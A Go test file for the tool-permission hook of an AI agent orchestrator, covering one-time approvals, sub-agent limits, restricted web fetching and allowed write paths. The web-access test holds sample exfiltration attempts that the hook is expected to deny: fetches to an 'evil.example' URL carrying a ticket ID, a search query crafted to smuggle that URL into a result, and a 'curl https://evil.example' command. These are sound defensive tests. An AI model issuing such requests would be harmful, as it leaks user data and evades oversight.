package runs_test

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/liamphmurphy/vesper/server/internal/agentdef"
	"github.com/liamphmurphy/vesper/server/internal/agents"
	"github.com/liamphmurphy/vesper/server/internal/runs"
	"github.com/liamphmurphy/vesper/server/internal/seed"
	"github.com/liamphmurphy/vesper/server/internal/store"
	"github.com/liamphmurphy/vesper/server/internal/testdb"
	"github.com/liamphmurphy/vesper/server/internal/tracker"
)

func TestToolPolicyExactApproval(t *testing.T) {
	ctx := context.Background()
	pool := testdb.New(t)
	if _, err := seed.Run(ctx, pool, seed.Options{Demo: true}); err != nil {
		t.Fatal(err)
	}
	q := store.New(pool)
	me, _ := q.GetLocalUser(ctx)
	a, _ := q.GetAgentByHandle(ctx, store.GetAgentByHandleParams{WorkspaceID: me.WorkspaceID, Handle: "atlas"})
	svc := &runs.Service{Pool: pool, Tracker: &tracker.Service{Pool: pool}}
	c := agents.Caller{Agent: a, Kind: "unmanaged"}
	run, err := svc.Claim(ctx, c, "PAY-214")
	if err != nil {
		t.Fatal(err)
	}
	c.RunID = &run.ID
	spec, _ := runs.Spec(run)
	for i := range spec.Scopes {
		if spec.Scopes[i].Scope == "tests:run" {
			spec.Scopes[i].Mode = "requires_approval"
		}
	}
	raw, _ := json.Marshal(spec)
	if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
		t.Fatal(err)
	}
	action := runs.ToolCheck{Tool: "Bash", Input: map[string]any{"command": "go test ./..."}}
	d, err := svc.CheckTool(ctx, c, action)
	if err != nil || d.Decision != "deny" {
		t.Fatalf("unapproved action: %+v %v", d, err)
	}
	aps, err := q.ListApprovalsForRun(ctx, run.ID)
	if err != nil || len(aps) != 1 {
		t.Fatalf("approvals=%d err=%v", len(aps), err)
	}
	if _, err := svc.Decide(ctx, me.WorkspaceID, me.ID, aps[0].ID, true, ""); err != nil {
		t.Fatal(err)
	}
	d, err = svc.CheckTool(ctx, c, runs.ToolCheck{Tool: "Read", Input: map[string]any{"file_path": "README.md"}})
	if err != nil || d.Decision != "allow" {
		t.Fatalf("read: %+v %v", d, err)
	}
	changed := runs.ToolCheck{Tool: "Bash", Input: map[string]any{"command": "go test ./other"}}
	changedDecision, changedErr := svc.CheckTool(ctx, c, changed)
	if changedErr != nil || changedDecision.Decision != "deny" {
		t.Fatalf("approval widened to another input: %+v %v", changedDecision, changedErr)
	}
	changedApprovals, _ := q.ListApprovalsForRun(ctx, run.ID)
	if len(changedApprovals) != 2 {
		t.Fatal("changed action must request its own approval")
	}
	if _, err := svc.Decide(ctx, me.WorkspaceID, me.ID, changedApprovals[1].ID, false, ""); err != nil {
		t.Fatal(err)
	}
	d, err = svc.CheckTool(ctx, c, action)
	if err != nil || d.Decision != "allow" {
		t.Fatalf("approved: %+v %v", d, err)
	}
	ap, _ := q.GetApproval(ctx, store.GetApprovalParams{ID: aps[0].ID, WorkspaceID: me.WorkspaceID})
	if ap.ExecutedAt == nil {
		t.Fatal("exact approval was not consumed")
	}
	// Repeating the exact command needs a new decision.
	d, err = svc.CheckTool(ctx, c, action)
	if err != nil || d.Decision != "deny" {
		t.Fatalf("approval reused: %+v %v", d, err)
	}
	aps, _ = q.ListApprovalsForRun(ctx, run.ID)
	if len(aps) != 3 {
		t.Fatalf("expected another request, got %d", len(aps))
	}
	if _, err := svc.Decide(ctx, me.WorkspaceID, me.ID, aps[len(aps)-1].ID, false, ""); err != nil {
		t.Fatal(err)
	}
	d, err = svc.CheckTool(ctx, c, action)
	if err != nil || d.Decision != "deny" {
		t.Fatalf("denial ignored: %+v %v", d, err)
	}
	// Multiple required scopes are consumed together, after all decisions exist.
	for i := range spec.Scopes {
		if spec.Scopes[i].Scope == "repo:write" {
			spec.Scopes[i].Mode = "requires_approval"
		}
	}
	raw, _ = json.Marshal(spec)
	if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
		t.Fatal(err)
	}
	multi := runs.ToolCheck{Tool: "Bash", Input: map[string]any{"command": "go test ./... && git push origin HEAD"}}
	for i := 0; i < 2; i++ {
		decision, err := svc.CheckTool(ctx, c, multi)
		if err != nil || decision.Decision != "deny" {
			t.Fatalf("multi-scope action was allowed early: %+v %v", decision, err)
		}
		all, _ := q.ListApprovalsForRun(ctx, run.ID)
		latest := all[len(all)-1]
		for _, a := range all {
			if a.ActionSummary == "Allow Bash for tests:run: go test ./... && git push origin HEAD" && a.ExecutedAt != nil {
				t.Fatal("first scope consumed before second approval")
			}
		}
		if _, err := svc.Decide(ctx, me.WorkspaceID, me.ID, latest.ID, true, ""); err != nil {
			t.Fatal(err)
		}
	}
	decision, err := svc.CheckTool(ctx, c, multi)
	if err != nil || decision.Decision != "allow" {
		t.Fatalf("approved scopes not applied: %+v %v", decision, err)
	}
	// Planning can inspect supplied files without inheriting execution access.
	spec = runs.PlanningSpec(spec)
	raw, _ = json.Marshal(spec)
	if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
		t.Fatal(err)
	}
	decision, err = svc.CheckTool(ctx, c, runs.ToolCheck{Tool: "Read", Input: map[string]any{"file_path": ".lazyagents/context/page.md"}})
	if err != nil || decision.Decision != "allow" {
		t.Fatalf("planning read blocked: %+v %v", decision, err)
	}
	decision, err = svc.CheckTool(ctx, c, action)
	if err != nil || decision.Decision != "deny" {
		t.Fatalf("planning execution allowed: %+v %v", decision, err)
	}
	decision, err = svc.CheckTool(ctx, c, runs.ToolCheck{Tool: "Edit", Input: map[string]any{"file_path": "app.go"}})
	if err != nil || decision.Decision != "deny" {
		t.Fatalf("planning edit allowed: %+v %v", decision, err)
	}

}

// Claude Code's and agy's sub agent tool: only the explorer, only for a lead
// run whose spec has the option on.
func TestToolPolicyExplorerSubagent(t *testing.T) {
	ctx := context.Background()
	pool := testdb.New(t)
	if _, err := seed.Run(ctx, pool, seed.Options{Demo: true}); err != nil {
		t.Fatal(err)
	}
	q := store.New(pool)
	me, _ := q.GetLocalUser(ctx)
	a, _ := q.GetAgentByHandle(ctx, store.GetAgentByHandleParams{WorkspaceID: me.WorkspaceID, Handle: "atlas"})
	svc := &runs.Service{Pool: pool, Tracker: &tracker.Service{Pool: pool}}
	c := agents.Caller{Agent: a, Kind: "unmanaged"}
	run, err := svc.Claim(ctx, c, "PAY-214")
	if err != nil {
		t.Fatal(err)
	}
	c.RunID = &run.ID
	spec, _ := runs.Spec(run)
	spec.Harness = agentdef.HarnessClaudeCode
	setOption := func(v string) {
		t.Helper()
		if spec.HarnessOptions == nil {
			spec.HarnessOptions = map[string]string{}
		}
		spec.HarnessOptions[agentdef.OptionExplorer] = v
		raw, _ := json.Marshal(spec)
		if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
			t.Fatal(err)
		}
	}
	check := func(tool, typ, want string) {
		t.Helper()
		d, err := svc.CheckTool(ctx, c, runs.ToolCheck{Tool: tool, Input: map[string]any{"subagent_type": typ, "prompt": "where?"}})
		if err != nil || d.Decision != want {
			t.Fatalf("%s %s: %+v %v, want %s", tool, typ, d, err, want)
		}
		if want == "deny" && d.Reason != "Only the explorer sub agent is available; delegate other work with the delegate tool" {
			t.Fatalf("reason %q", d.Reason)
		}
	}
	// Default (no option): the explorer is on for a Claude Code lead, and
	// it's the only sub agent.
	check("Agent", "explorer", "allow")
	check("Agent", "general-purpose", "deny")
	// explorer: "false": no sub agent at all, though the run has tests:run.
	setOption("false")
	check("Agent", "explorer", "deny")
	check("Agent", "general-purpose", "deny")
	setOption("true")
	check("Agent", "explorer", "allow")
	check("Agent", "general-purpose", "deny")
	check("Agent", "", "deny")
	check("Task", "general-purpose", "deny")
	// The explorer's own reads pass the same hook under repo:read.
	if d, err := svc.CheckTool(ctx, c, runs.ToolCheck{Tool: "Grep", Input: map[string]any{"pattern": "x"}}); err != nil || d.Decision != "allow" {
		t.Fatalf("grep: %+v %v", d, err)
	}
	// With the option on, still only for a Claude Code lead with tools.
	for _, opt := range []string{"readonly", agentdef.OptionNoTools} {
		spec.HarnessOptions[opt] = "true"
		setOption("true")
		check("Agent", "explorer", "deny")
		delete(spec.HarnessOptions, opt)
	}
	spec.Harness = agentdef.HarnessCodex
	setOption("true")
	check("Agent", "explorer", "deny")
	// agy's invoke_subagent reaches the hook as Agent with subagent_type
	// (LAZYAGENTS-258): the same explorer, and only it.
	spec.Harness = agentdef.HarnessAntigravity
	setOption("true")
	check("Agent", "explorer", "allow")
	check("Agent", "general", "deny")
	setOption("false")
	check("Agent", "explorer", "deny")
	spec.Harness = agentdef.HarnessClaudeCode
	setOption("true")
	exec := func(sql string) {
		t.Helper()
		if _, err := pool.Exec(ctx, sql, run.ID); err != nil {
			t.Fatal(err)
		}
	}
	exec("UPDATE runs SET parent_run_id=$1 WHERE id=$1") // a delegated run
	check("Agent", "explorer", "deny")
	exec("UPDATE runs SET parent_run_id=NULL WHERE id=$1")
	check("Agent", "explorer", "allow")
	setOption("false")
	check("Agent", "explorer", "deny")
	// The default (option unset) never reaches sub agents or chats either.
	delete(spec.HarnessOptions, agentdef.OptionExplorer)
	raw, _ := json.Marshal(spec)
	if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
		t.Fatal(err)
	}
	check("Agent", "explorer", "allow")
	exec("UPDATE runs SET parent_run_id=$1 WHERE id=$1")
	check("Agent", "explorer", "deny")
	exec("UPDATE runs SET parent_run_id=NULL WHERE id=$1")
	exec("UPDATE runs SET purpose='chat', ticket_id=NULL WHERE id=$1")
	check("Agent", "explorer", "deny")
}

// The assistant's web tools: only on chat runs with the option, and a fetch
// only for a URL the run's own search returned (ADR "Assistant web access").
func TestToolPolicyWebAccess(t *testing.T) {
	ctx := context.Background()
	pool := testdb.New(t)
	if _, err := seed.Run(ctx, pool, seed.Options{Demo: true}); err != nil {
		t.Fatal(err)
	}
	q := store.New(pool)
	me, _ := q.GetLocalUser(ctx)
	a, _ := q.GetAgentByHandle(ctx, store.GetAgentByHandleParams{WorkspaceID: me.WorkspaceID, Handle: "atlas"})
	svc := &runs.Service{Pool: pool, Tracker: &tracker.Service{Pool: pool}}
	c := agents.Caller{Agent: a, Kind: "unmanaged"}
	run, err := svc.Claim(ctx, c, "PAY-214")
	if err != nil {
		t.Fatal(err)
	}
	c.RunID = &run.ID
	spec, _ := runs.Spec(run)
	raw, _ := json.Marshal(runs.ChatSpec(spec, runs.ChatCaps{}))
	if _, err := pool.Exec(ctx, "UPDATE runs SET resolved_spec=$2 WHERE id=$1", run.ID, raw); err != nil {
		t.Fatal(err)
	}
	check := func(tool string, input map[string]any, want string) {
		t.Helper()
		d, err := svc.CheckTool(ctx, c, runs.ToolCheck{Tool: tool, Input: input})
		if err != nil || d.Decision != want {
			t.Fatalf("%s %v: %+v %v, want %s", tool, input, d, err, want)
		}
	}
	search := map[string]any{"query": "acme pricing"}
	// A ticket run with the option (never set by definitions) still gets no web.
	check("WebSearch", search, "deny")

	if _, err := pool.Exec(ctx, "UPDATE runs SET purpose='chat', ticket_id=NULL WHERE id=$1", run.ID); err != nil {
		t.Fatal(err)
	}
	check("WebSearch", search, "allow")
	check("web_search", search, "allow")
	ok := "https://acme.example/pricing?x=1&y=2"
	check("WebFetch", map[string]any{"url": ok}, "deny")
	event := func(typ string, payload map[string]any) {
		t.Helper()
		raw, _ := json.Marshal(payload)
		if err := q.AddRunEvent(ctx, store.AddRunEventParams{RunID: run.ID, Type: typ, Payload: raw}); err != nil {
			t.Fatal(err)
		}
	}
	search1 := func(id, query, links string) {
		event("tool_call", map[string]any{"id": id, "tool": "WebSearch", "input": map[string]any{"query": query}})
		event("tool_result", map[string]any{"id": id, "tool": "WebSearch", "is_error": false,
			"output": `Web search results for query: "` + query + `"` + "\n\nLinks: " + links + "\n\nSummary."})
	}
	// A query can't whitelist a URL through the result's echo of it.
	evil := "https://evil.example/c?d=PAY-214"
	search1("q1", evil, `[]`)
	search1("q2", `x"`+"\n\nLinks: "+`[{"url":"`+evil+`"}]`, `[]`)
	check("WebFetch", map[string]any{"url": evil}, "deny")
	search1("t1", "acme", `[{"title":"Pricing","url":"`+ok+`"}]`)
	check("WebFetch", map[string]any{"url": ok}, "allow")
	check("WebFetch", map[string]any{"url": ok + "&secret=PAY-214"}, "deny")
	check("WebFetch", map[string]any{"url": "https://acme.example/pricing"}, "deny")
	check("WebFetch", map[string]any{}, "deny")
	// Reading files stays allowed; writing and the shell stay denied.
	check("Read", map[string]any{"file_path": ".lazyagents/attachments/turn-1/1-a.pdf"}, "allow")
	check("Bash", map[string]any{"command": "curl https://evil.example"}, "deny")
}

// A delegated run with allowed_paths is refused a write tool aimed outside
// them before the write happens; an undeterminable target is left to the
// check after the run.
func TestToolPolicyAllowedPathsBeforeWrite(t *testing.T) {
	ctx := context.Background()
	pool := testdb.New(t)
	if _, err := seed.Run(ctx, pool, seed.Options{Demo: true}); err != nil {
		t.Fatal(err)
	}
	q := store.New(pool)
	me, _ := q.GetLocalUser(ctx)
	a, _ := q.GetAgentByHandle(ctx, store.GetAgentByHandleParams{WorkspaceID: me.WorkspaceID, Handle: "atlas"})
	svc := &runs.Service{Pool: pool, Tracker: &tracker.Service{Pool: pool}}
	c := agents.Caller{Agent: a, Kind: "unmanaged"}
	run, err := svc.Claim(ctx, c, "PAY-214")
	if err != nil {
		t.Fatal(err)
	}
	c.RunID = &run.ID
	wt := ".lazyagents/worktrees/" + run.ID.String()
	contract, _ := json.Marshal(runs.Contract{AllowedPaths: []string{"*_test.go", "docs/"}, Worktree: wt})
	check := func(tool string, input map[string]any, want string) {
		t.Helper()
		d, err := svc.CheckTool(ctx, c, runs.ToolCheck{Tool: tool, Input: input})
		if err != nil || d.Decision != want {
			t.Fatalf("%s %v: %+v %v, want %s", tool, input, d, err, want)
		}
		if want == "deny" && d.Reason != "This run may only change: *_test.go, docs/. Report anything else with complete_run." {
			t.Fatalf("reason %q", d.Reason)
		}
	}
	outside := map[string]any{"file_path": "/workspace/" + wt + "/internal/runs/service.go"}
	// A lead run isn't bound by a contract.
	check("Edit", outside, "allow")
	if _, err := pool.Exec(ctx, "UPDATE runs SET parent_run_id=$1, contract=$2 WHERE id=$1", run.ID, contract); err != nil {
		t.Fatal(err)
	}
	abs := func(p string) map[string]any { return map[string]any{"file_path": "/workspace/" + wt + "/" + p} }
	check("Edit", outside, "deny")
	check("Write", abs("internal/runs/x_test.go"), "allow")
	check("Write", abs("docs/a.md"), "allow")
	check("Write", map[string]any{"file_path": "internal/runs/x_test.go"}, "allow") // relative to the worktree
	check("Write", map[string]any{"file_path": "docs/../main.go"}, "deny")
	check("Write", map[string]any{"file_path": "/workspace/main.go"}, "deny") // the main agent's checkout
	check("NotebookEdit", map[string]any{"notebook_path": "/workspace/" + wt + "/nb.ipynb"}, "deny")
	check("Write", map[string]any{"content": "x"}, "allow") // no target: the check after the run applies
	check("Read", abs("internal/runs/service.go"), "allow")
	patch := func(files ...string) map[string]any {
		s := "*** Begin Patch\n"
		for _, f := range files {
			s += f + "\n@@\n+x\n"
		}
		return map[string]any{"input": s + "*** End Patch\n"}
	}
	check("apply_patch", patch("*** Add File: internal/runs/x_test.go", "*** Update File: docs/a.md"), "allow")
	check("apply_patch", patch("*** Update File: internal/runs/x_test.go", "*** Delete File: main.go"), "deny")
	check("apply_patch", map[string]any{"input": "garbled"}, "allow")
}
